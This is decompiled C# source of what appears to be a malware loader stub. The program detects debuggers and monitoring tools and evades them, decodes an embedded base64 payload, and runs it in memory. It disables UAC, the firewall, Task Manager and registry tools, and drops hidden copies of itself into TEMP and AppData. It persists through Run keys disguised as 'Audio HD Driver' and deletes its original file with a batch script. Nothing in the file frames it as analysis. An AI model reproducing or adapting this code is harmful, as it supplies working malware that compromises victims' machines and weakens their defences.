using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class0
{
	private static Class1 class1_0 = new Class1();

	private static string string_0 = "81b1735e4d63f176b2a490afe072e4a5";

	private static string string_1 = "81b1735e4d63f176b2a490afe072e4a5";

	private static byte[] byte_0 = new byte[7] { 98, 87, 76, 65, 54, 43, 32 };

	private static byte[] byte_1;

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	private static bool bool_2 = false;

	private static bool bool_3 = false;

	private static bool bool_4 = false;

	private static bool bool_5 = false;

	private static bool bool_6 = false;

	private static bool bool_7 = false;

	private static bool bool_8 = false;

	private static bool bool_9 = false;

	private static bool bool_10 = false;

	private static bool bool_11 = false;

	private static bool bool_12 = false;

	private static bool bool_13 = false;

	private static bool bool_14 = false;

	private static bool bool_15 = false;

	private static string string_2 = "ValuefakeErrorMessage";

	private static string string_3 = "ValuefakeErrorTitle";

	private static bool bool_16 = true;

	private static bool bool_17 = false;

	private static bool bool_18 = false;

	private static bool bool_19 = false;

	private static bool bool_20 = false;

	private static bool bool_21 = true;

	private static string string_4 = "a4kHxTR3cpN0.exe";

	private static bool bool_22 = true;

	private static bool bool_23 = true;

	private static int int_0 = 2;

	private static ThreadStart threadStart_0;

	private static bool smethod_0(string string_5)
	{
		return Process.GetProcessesByName(string_5).Length > 0;
	}

	private static void smethod_1(string string_5, string string_6)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(string_5, string_6, (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static void smethod_2()
	{
		Console.Write("4th3l4lz");
	}

	private static void Main(string[] args)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		if (!(string_0 == string_1))
		{
			return;
		}
		smethod_2();
		if (bool_15)
		{
			try
			{
				if (threadStart_0 == null)
				{
					threadStart_0 = smethod_4;
				}
				Thread thread = new Thread(threadStart_0);
				thread.Start();
			}
			catch
			{
			}
		}
		smethod_2();
		if (bool_0)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_1)
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				num2 = DateTime.Now.Ticks;
				if (num2 - num < 10L)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_2)
		{
			try
			{
				if (smethod_0("NETSTAT"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_3)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text("TEST");
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == "[#] TEST [#]")
				{
					return;
				}
				val.Close();
			}
			catch
			{
			}
		}
		if (bool_4)
		{
			try
			{
				if (smethod_0("FILEMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_5)
		{
			try
			{
				if (smethod_0("PROCMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_6)
		{
			try
			{
				if (smethod_0("REGMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_7)
		{
			try
			{
				if (smethod_0("CAIN"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_8)
		{
			try
			{
				if (smethod_0("NETMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_9)
		{
			try
			{
				if (smethod_0("TCPVIEW"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		smethod_2();
		if (bool_23)
		{
			try
			{
				Thread.Sleep(int_0 * 1000);
			}
			catch
			{
			}
		}
		smethod_2();
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("file");
			smethod_2();
			StreamReader streamReader = new StreamReader(manifestResourceStream);
			string s = streamReader.ReadToEnd();
			smethod_2();
			streamReader.Close();
			byte_1 = Convert.FromBase64String(s);
			try
			{
				smethod_2();
				Thread thread2 = new Thread(smethod_3);
				smethod_2();
				thread2.Start();
				smethod_2();
			}
			catch
			{
			}
		}
		catch
		{
		}
		smethod_2();
		if (bool_16)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (registryKey == null)
				{
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				}
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			if (bool_17)
			{
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				if (registryKey2 == null)
				{
					registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
					Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
				}
			}
			if (bool_18)
			{
				try
				{
					Process process = new Process();
					process.StartInfo.FileName = "Netsh";
					process.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				catch
				{
				}
			}
			if (bool_19)
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (registryKey3 == null)
					{
						registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
			if (bool_20)
			{
				try
				{
					RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (registryKey4 == null)
					{
						registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
		}
		smethod_2();
		if (bool_21)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				string fileName = Process.GetCurrentProcess().MainModule!.FileName;
				FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
				fileStream.Close();
				FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_4, FileMode.Create);
				fileStream2.Write(array, 0, array.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				FileStream fileStream3 = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_4, FileMode.Create);
				fileStream3.Write(array, 0, array.Length);
				fileStream3.Close();
				fileStream3.Dispose();
				File.SetAttributes(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_4, FileAttributes.Hidden);
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_4, FileAttributes.Hidden);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_4);
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_4);
			}
			catch
			{
			}
			if (bool_16)
			{
				try
				{
					RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
					if (registryKey5 == null)
					{
						registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_4);
					}
					else
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_4);
					}
				}
				catch
				{
				}
			}
		}
		smethod_2();
		if (!bool_22)
		{
			return;
		}
		try
		{
			if (!Application.get_ExecutablePath().Contains(Environment.GetEnvironmentVariable("TEMP")))
			{
				string value = ":Repeat\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat";
				TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
				textWriter.WriteLine(value);
				textWriter.Close();
				Process process2 = new Process();
				process2.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
				process2.StartInfo.UseShellExecute = false;
				process2.StartInfo.CreateNoWindow = true;
				process2.Start();
			}
		}
		catch
		{
		}
	}

	public static void smethod_3()
	{
		try
		{
			smethod_2();
			Assembly assembly = Assembly.Load(byte_1);
			MethodInfo entryPoint = assembly.EntryPoint;
			smethod_2();
			entryPoint.Invoke(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name)), new object[1] { new string[0] });
		}
		catch
		{
			try
			{
				smethod_2();
				Assembly assembly2 = Assembly.Load(byte_1);
				MethodInfo entryPoint2 = assembly2.EntryPoint;
				smethod_2();
				entryPoint2.Invoke(RuntimeHelpers.GetObjectValue(assembly2.CreateInstance(entryPoint2.Name)), new object[0]);
			}
			catch
			{
				try
				{
					smethod_2();
					Assembly assembly3 = Assembly.Load(byte_1);
					MethodInfo entryPoint3 = assembly3.EntryPoint;
					smethod_2();
					entryPoint3.Invoke(null, null);
				}
				catch
				{
					try
					{
						smethod_2();
						class1_0.method_1(byte_1, string.Empty, Application.get_ExecutablePath());
						smethod_2();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void smethod_4()
	{
		smethod_1(string_2, string_3);
	}
}
